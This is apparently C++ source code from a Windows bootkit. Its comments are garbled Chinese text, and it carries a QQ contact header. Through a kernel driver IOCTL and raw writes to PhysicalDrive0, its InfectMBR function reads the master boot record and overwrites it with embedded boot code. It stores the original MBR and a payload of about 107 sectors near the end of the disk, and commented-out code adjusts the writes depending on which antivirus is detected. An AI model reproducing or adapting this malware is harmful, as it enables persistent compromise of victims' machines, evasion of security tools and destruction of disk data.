////////////////
/////QQ:200816000
/////˳�����¹�Ӱ
//////////////////
#include "Common.h"


//---------- ���ļ���Ҫ������,�������ļ�����(����ʼ��)�� ȫ�ֱ��� ----------//
extern	char		g_szSystemPath[MAX_PATH];
extern	HANDLE		g_hDriver;
extern	HMODULE		g_hSelfModule;
extern	ENVIRINFO	g_EnvirInfo;
//---------- ���ļ���Ҫ������,�������ļ�����(��ʵ��)�� �ӳ��� --------------//
BOOL	Reresource(HMODULE hModule, int iReID, char *pFilePath, char *pMem, DWORD *pdwReSize);
//--------------------------------------------------------------------------//

#define	SECTORSIZE	512		//������С

#define IOCTL_DISK_INITIAL			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90E, METHOD_IN_DIRECT, FILE_ANY_ACCESS)
#define IOCTL_DISK_READWRITE		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x90F, METHOD_IN_DIRECT, FILE_ANY_ACCESS)

#pragma pack(1)
typedef	struct	__RWINFO{
	unsigned __int64	LBA;
	USHORT	usSectorCount;
	DWORD	dwOperateSize;
	DWORD	dwFlags;
}RWINFO, *PRWINFO;
#pragma pack()

DWORD				g_dwCurHDDId = 0, g_dwDiskInitial = 0;
unsigned __int64	g_llDiskSize = 0;

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Code <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
//У��ͼ���
USHORT CheckSum(const char *buf, int size) 
{ 
	USHORT *buffer=(USHORT *)buf;
	unsigned long cksum=0; 
	while(size >1) 
	{ 
		cksum+=*buffer++; 
		size -=sizeof(USHORT); 
	} 
	if(size ) 
	{ 
		cksum += *(UCHAR*)buffer; 
	} 

	cksum = (cksum >> 16) + (cksum & 0xffff); 
	cksum += (cksum >>16); 
	return (USHORT)(~cksum); 
} 

//��ȡϵͳ�����ڵ�Ӳ�̵�MBR��'Windows disk signature', ���������ҵ�����Ӳ��
DWORD GetCurHDDSign()
{
	DWORD	dwSignature = 0;
	char	szVN[MAX_PATH];
	HANDLE	hFile = INVALID_HANDLE_VALUE;


	//��·��
	wsprintf(szVN, "\\\\.\\%C:", *g_szSystemPath);

	//��ȡ�˷���(��)��Ϣ
	hFile = CreateFile(szVN, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		char	cOutBuf[512];//ע���С
		DWORD	dwByte = 0;
		

		memset(cOutBuf, 0, sizeof(cOutBuf));
		if(DeviceIoControl(hFile, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, NULL, 0, cOutBuf, sizeof(cOutBuf), &dwByte, NULL) == TRUE)
		{
			dwSignature = (DiskGeometryGetPartition( (DISK_GEOMETRY_EX*)&cOutBuf[0] ))->Mbr.Signature;

			//���浱ǰӲ�̴�С��ȫ�ֱ���(�������ӵĴ���)
			g_llDiskSize = (unsigned __int64)(( (DISK_GEOMETRY_EX*)&cOutBuf[0] )->DiskSize.QuadPart);
		}

		CloseHandle( hFile );
	}

	return dwSignature;
}

//ֱ�Ӷ�дӲ��ǰ�ĳ�ʼ��
BOOL DiskInitial()
{
	if(g_hDriver != INVALID_HANDLE_VALUE)
	{
		DWORD	dwByte = 0, dwSignatrue = 0;

		dwSignatrue = GetCurHDDSign();
		if(dwSignatrue != 0)
		{
			return DeviceIoControl(g_hDriver, IOCTL_DISK_INITIAL, &dwSignatrue, sizeof(dwSignatrue), NULL, 0, &dwByte, NULL);
		}
		//////else
		//////{
		//////	//��ȡӲ�̵����к�,�����кŽ���ƥ��
		//////	//CreateFile(volume,....)
		//////	//DeviceIoControl(, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, ....)
		//////	//CreateFile(\\\\.\\PhysicalDrive + DISK_EXTENT.DiskNumber, .... )
		//////	//DeivceIoControl(, SMART_RCV_DRIVE_DATA, )
		//////	;
		//////}
	}

	return FALSE;
}


//��������ͨ��I/O�˿�ֱ�Ӷ�д������Ӳ��. 1 - ��, 2 - д, �ɹ����� 0, ����ʧ��.
DWORD DiskReadWrite(unsigned __int64 LBA, USHORT usSectorCount, char *pBuffer, DWORD dwBufSize, DWORD dwFlags)
{
	#define	SECTIONSIZE		512

	DWORD	dwResult = 0, dwByte = 0;
	RWINFO	RwInfo;





//	MessageBox(NULL, "2","1", 0 );


	//�����Ҫ,��ʼ��
	if(g_dwDiskInitial == 0)
	{
		g_dwDiskInitial = 1;
		if(DiskInitial() == FALSE)
		{
			g_dwDiskInitial = 2;
		}
	}
	if(g_dwDiskInitial != 1)
	{
//		dwResult = 2;
//		goto __END;
	}

//	MessageBox(NULL, "3","1", 0 );

	//�������
	if((usSectorCount < 1) || dwBufSize < (SECTORSIZE * (DWORD)usSectorCount))
	{
		dwResult = 1;
		goto __END; 
	}
//	MessageBox(NULL, "4","1", 0 );

	//����
	RwInfo.LBA = LBA;
	RwInfo.usSectorCount = usSectorCount;
	RwInfo.dwOperateSize = RwInfo.usSectorCount * SECTORSIZE;
	RwInfo.dwFlags = dwFlags;

	if(DeviceIoControl(g_hDriver, IOCTL_DISK_READWRITE, &RwInfo, sizeof(RwInfo), pBuffer, dwBufSize, &dwByte, NULL) == FALSE)
	{
		dwResult = 3;
		goto __END;
	}

__END:
	return dwResult;
}


DWORD DiskRead( IN __int64 qwStartSector, IN DWORD dwSectors, OUT PVOID pOutBuffer )
{
	DWORD			dwResult		= 0;
	BOOL			bResult			= FALSE;
	DWORD			dwNeedBytes		= 0;
	DWORD			dwBytesRet		= 0;
	HANDLE			hDevice			= (HANDLE)0;//INVALID_HANDLE_VALUE;
	char			szDevName[32]	= {0};
	LARGE_INTEGER	BytesOffset;
//		__g_diskhandle[0] = NULL;

	do
	{
		if ( NULL == pOutBuffer  )
		{
			dwResult = 1; break;
		}

//		if ( __g_diskhandle[0] == NULL )
		{
//			sprintf( szDevName, ("\\\\.\\PhysicalDrive%u"), 0 );
			hDevice = ::CreateFile( "\\\\.\\PhysicalDrive0", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL|FILE_FLAG_NO_BUFFERING, NULL );
			if ( INVALID_HANDLE_VALUE == hDevice )
			{
				dwResult = ( ::GetLastError() ); break;
			}
//			__g_diskhandle[0] = hDevice;
		}

//		hDevice = __g_diskhandle[0];

		BytesOffset.QuadPart = qwStartSector;
		BytesOffset.QuadPart *= 512;
		dwResult = ::SetFilePointer( hDevice, BytesOffset.LowPart, &(BytesOffset.HighPart), FILE_BEGIN );
		if ( INVALID_SET_FILE_POINTER == dwResult )
		{
			dwResult = ::GetLastError();
			if ( 0 != dwResult )
			{
				( dwResult ); break;
			}
		}
		dwResult = 0;
		dwNeedBytes	= dwSectors * 512;
		bResult = ::ReadFile( hDevice, pOutBuffer, dwNeedBytes, &dwBytesRet, NULL );
		if ( !bResult )
		{
			dwResult = ( ::GetLastError() ); break;
		}
		if ( dwBytesRet != dwNeedBytes )
		{
			dwResult = 2; break;
		}
	} while(0);

	if ( INVALID_HANDLE_VALUE != hDevice )
	{
		::CloseHandle( hDevice ); hDevice = INVALID_HANDLE_VALUE;
	}

	return dwResult;
}

DWORD DiskWrite(  IN __int64 qwStartSector, IN DWORD dwSectors, IN PVOID pInBuffer )
{
	DWORD			dwResult		= 0;
	BOOL			bResult			= FALSE;
	DWORD			dwNeedBytes		= 0;
	DWORD			dwBytesRet		= 0;
	HANDLE			hDevice			= (HANDLE)0;//INVALID_HANDLE_VALUE;
	char			szDevName[32]	= {0};
	LARGE_INTEGER	BytesOffset;

	do
	{
		if ( NULL == pInBuffer )
		{
			dwResult = 1; break;
		}
//		__g_diskhandle[0] = NULL;
//		if ( __g_diskhandle[0] == NULL )
		{
		
//			sprintf( szDevName, ("\\\\.\\PhysicalDrive%u"), 0 );
			hDevice = ::CreateFile( "\\\\.\\PhysicalDrive0", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL|FILE_FLAG_NO_BUFFERING, NULL );
			if ( INVALID_HANDLE_VALUE == hDevice )
			{
				dwResult = ( ::GetLastError() ); break;
			}
//			__g_diskhandle[0] = hDevice;
		}

//		hDevice = __g_diskhandle[0];

		BytesOffset.QuadPart = qwStartSector;
		BytesOffset.QuadPart *= 512;
		dwResult = ::SetFilePointer( hDevice, BytesOffset.LowPart, &(BytesOffset.HighPart), FILE_BEGIN );
		if ( INVALID_SET_FILE_POINTER == dwResult )
		{
			dwResult = ::GetLastError();
			if ( 0 != dwResult )
			{
				( dwResult ); break;
			}
		}
		dwResult = 0;
		dwNeedBytes	= dwSectors * 512;
		bResult = ::WriteFile( hDevice, pInBuffer, dwNeedBytes, &dwBytesRet, NULL );
		if ( !bResult )
		{
			dwResult = ( ::GetLastError() ); break;
		}
		if ( dwBytesRet != dwNeedBytes )
		{
			dwResult = ( ERROR_WRITE_FAULT ); break;
		}
	} while(0);

	if ( INVALID_HANDLE_VALUE != hDevice )
	{
		::CloseHandle( hDevice ); hDevice = INVALID_HANDLE_VALUE;
	}

	return dwResult;
}

DWORD DiskReadWriteAPI( unsigned __int64 LBA, USHORT usSectorCount, char *pBuffer, DWORD dwBufSize, DWORD dwFlags )
{
	if ( dwFlags == 1 )
	{
		return DiskRead(  LBA, usSectorCount, pBuffer );
	}
	else
		return DiskWrite(  LBA, usSectorCount, pBuffer );

//	memset( lpBuf, 1, dwSecs * 512 );
	return 0;
}
//��ȾMBR
BOOL InfectMBR()
{
//	MessageBox(NULL, "a","1", 0 );
	BOOL	bStatus = FALSE;
	char	SrcMBR[SECTORSIZE], *pBoot = NULL, *pCurPointer = NULL, IcafeData[SECTORSIZE*2], cTemp[SECTORSIZE*14], *pMove = NULL;
	DWORD	dwReSize = 0;

	DiskInitial();

//	MessageBox(NULL, "b","1", 0 );

	BYTE bIsAPI = 0;
	//ԭʼMBR������?
	DWORD i;

	for ( i=0; i<8; i++ )
	{
		if(DiskReadWrite(0, 1, cTemp, sizeof(cTemp), 1) == 0)
		{
			if ( *(WORD *)&cTemp[0x1fe] == 0xaa55 )
				break;	
		}
	}

	if ( *(WORD *)&cTemp[0x1fe] != 0xaa55 )
	{
		bIsAPI = 1;
		DiskReadWriteAPI(0, 1, cTemp, sizeof(cTemp), 1);

	}

//	MessageBox(NULL, "c","1", 0 );

	if ( *(WORD *)&cTemp[0x1fe] != 0xaa55 )
		goto __END;



	if ( *(DWORD *)&cTemp[0x1a2] == 0x44332211  && *(DWORD *)&cTemp[0x190] )
	{
		memset( SrcMBR, 0, sizeof(SrcMBR) );

		for ( i=0; i<8; i++ )
		{
			if(DiskReadWrite(0, 1, SrcMBR, sizeof(SrcMBR), 1) == 0)
			{
				if ( *(WORD *)&SrcMBR[0x1fe] == 0xaa55 )
					break;	
			}
		}


		if ( *(WORD *)&SrcMBR[0x1fe] != 0xaa55 )
		{
			DiskReadWriteAPI(0, 1, SrcMBR, sizeof(SrcMBR), 1);

		}

		if ( *(WORD *)&SrcMBR[0x1fe] != 0xaa55 )
		{
			memcpy(SrcMBR, cTemp, sizeof(SrcMBR));
		}
	}
	else
	{
		memcpy(SrcMBR, cTemp, sizeof(SrcMBR));
	}
//	MessageBox(NULL, "d","1", 0 );

	//����һ���ڴ� 512*63 = 32256 = 0x7E00
	pBoot = (char*)VirtualAlloc(NULL, 0x10000,  MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	if(pBoot == NULL)
	{
		goto __END;
	}
	memset(pBoot, 0, 0x10000);	//һ��Ҫ��0!�������(��Ϊ��׮...)

	//����ԴBootCode.bin��SR.dll�����ڴ���, ��ԭʼMBR �����ڴ���
	pCurPointer = pBoot;
	Reresource(g_hSelfModule, FILE_BOOTCODE, NULL, pCurPointer, &dwReSize);
	pCurPointer = pCurPointer + dwReSize;
	Reresource(g_hSelfModule, FILE_SR, NULL, pCurPointer, &dwReSize);
	memcpy(pBoot + SECTORSIZE, SrcMBR, SECTORSIZE);

	memcpy(pBoot + 0x01B4, &SrcMBR[0x01B4], 76);	//ע��
//	MessageBox(NULL, "e","1", 0 );

	//���ض�λ���Ƴ�2������,����ԭ�����ڵ�����, Ϊ����ά
/*	memset(IcafeData, 0, sizeof(IcafeData));
	DiskReadWrite(50, 2, IcafeData, sizeof(IcafeData), 1);
	memcpy(cTemp, pBoot + 0x6400, (0x7E00 - 0x6400));
	memcpy(pBoot + 0x6400, IcafeData, (SECTORSIZE * 2));
	memcpy(pBoot + 0x6800, cTemp, (0x7E00 - 0x6800));	//ע��,�����������, pBoot��ԭ 7A00 - 7DFF (2������) �����ݱ�������!

	//�����62��������У���, ���������
	pMove = NULL;
	for(DWORD i = 0; i < SECTORSIZE; i++)
	{
		if(*(DWORD*)(pBoot + i) == 0x44332211)
		{
			pMove = pBoot + i;
			break;
		}
	}
	if(pMove == NULL)
	{
		goto __END;	//��Ȼ�Ҳ���������? δ֪����
	}
	*(DWORD*)pMove = 0x00000000;
	pMove = pMove - sizeof(WORD);
	*(USHORT*)pMove = CheckSum(pBoot + SECTORSIZE, SECTORSIZE * 62);
*/
	//ȷ��Ӳ��ĩβ��62����������ʼλ��,���������
	unsigned __int64	llBackLBA = 0;

	llBackLBA = (g_llDiskSize / SECTORSIZE) - 110;
/*
	pMove = pMove - sizeof(DWORD) - sizeof(DWORD);
	*(DWORD*)pMove = (DWORD)llBackLBA;
	pMove = pMove + sizeof(DWORD);
	*(DWORD*)pMove = (DWORD)(llBackLBA >> 32);

	//������ڴ�д��Ӳ�� ��ͷ�� 63����	-> ע��,�����Ѹ��,��Ҫдͷ��,��ΪѸ��ʹ����,�����������²�����
	DWORD	dwWriteCount = 63;

	if((g_EnvirInfo.dwAntiVirus & 0x04) == 0x04)	//Ѹ��
	{
		dwWriteCount = 1;
	}

	if( DiskReadWrite(0, (USHORT)dwWriteCount, pBoot, 0x7E00, 2) == 0)
	{
		bStatus = TRUE;
	}
*/
	*(DWORD *)(pBoot+0x190) = llBackLBA;
//	DWORD i;

	for ( i=0; i<10; i++ )
	{
		if( DiskReadWrite(0, (USHORT)1, pBoot, 0x200, 2) == 0)
		{
			bStatus = TRUE; break;
		}
	}

//		MessageBox(NULL, "f","1", 0 );

	if ( bIsAPI )
	{
		DiskReadWriteAPI(0, (USHORT)1, pBoot, 0x200, 2);
	}

	//�ٽ���62������д��Ӳ��ĩβ��
	for ( i=0; i<10; i++ )
	{
		if ( DiskReadWrite(llBackLBA, 0x40, pBoot + SECTORSIZE, 0x8000, 2) == 0 ) break;
	}
	for ( i=0; i<10; i++ )
	{
		if ( DiskReadWrite(llBackLBA+0x40, 0x2b, pBoot + SECTORSIZE+0x8000, 0x5600, 2) == 0 ) break;
	}

	DiskReadWriteAPI(llBackLBA, 107, pBoot + SECTORSIZE, 0x7800+0x5600 - SECTORSIZE, 2);
//	MessageBox(NULL," end ..","a",0 );

__END:
	if(pBoot != NULL)
	{
		VirtualFree(pBoot, 0, MEM_RELEASE);
	}

	return bStatus;
}